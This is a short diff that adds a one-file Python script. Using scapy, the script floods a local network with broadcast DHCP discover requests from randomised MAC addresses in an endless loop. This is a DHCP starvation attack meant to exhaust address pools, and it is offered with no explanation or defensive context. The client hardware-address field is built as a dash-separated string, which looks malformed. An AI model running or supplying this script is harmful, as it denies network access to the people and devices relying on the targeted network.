@@ -1,0 +1,2 @@
+from scapy.all import *;import random;import time
+while 1:sendp(Ether(src=":".join([f"{random.randint(0,255):02x}"for _ in range(6)]),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=":".join([f"{random.randint(0,255):02x}"for _ in range(6)]).replace(':','-'),flags=0x8000)/DHCP(options=[("message-type","discover"),"end"]),verbose=0);time.sleep(0.1)
